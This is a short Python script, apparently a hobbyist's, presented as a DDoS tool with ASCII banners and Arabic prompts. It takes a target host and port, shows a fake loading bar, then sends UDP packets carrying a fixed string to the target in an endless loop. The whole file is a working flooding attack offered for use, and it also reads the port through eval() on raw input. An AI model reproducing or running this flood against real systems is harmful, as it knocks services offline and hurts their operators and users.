#Abdullah_Almutairi_2022

import socket
import os
import time
Fore = ''
dev = '' \
      '3naizah'
'dev 3bood'
'i love Python 🐍'
'User me -->:@i_8_s'


print( """                                                                                                                                                           


  ____  _                     _ 
 |___ \| |                   | |
   __) | |__   ___   ___   __| |
  |__ <| '_ \ / _ \ / _ \ / _` |
  ___) | |_) | (_) | (_) | (_| |
 |____/|_.__/ \___/ \___/ \__,_|
                                
                               Ddos attack; 
                              
  



""")
print('''

  Ddoss Atack 🤓
 tolls Abood is king   

''')

print("==========================================")
print( Fore +""" اداة عبدالله المطيري لحرق الداتا في الايبي
""")
print("==========================================")
target = input("حط عنوان الايبي : ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")
ip = socket.gethostbyname(target)
port = eval(input("رقم البورت  : "))
vv1ck = "3bood_is_Here_$_"
print(Fore +"تحميل{>>> }5%")
time.sleep(1)
print("تحميل{>>>>> }10%")
time.sleep(1)
print("تحميل{>>>>>> }25%")
time.sleep(1)
print("تحميل{>>>>>>> }55%")
time.sleep(1)
print(Fore +"تحميل{>>>>>>>>>> }90%")
time.sleep(1)
print(Fore +"تحميل{>>>>>>>>>>>>>>}100%")
os.system("figlet Attack_Starting")
while True:
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   sock.sendto(bytes(vv1ck,"UTF-8"), (ip,port))
   time.sleep(0)
   print(port, "<===تم أرسال هجمه ✅ ===>",ip)
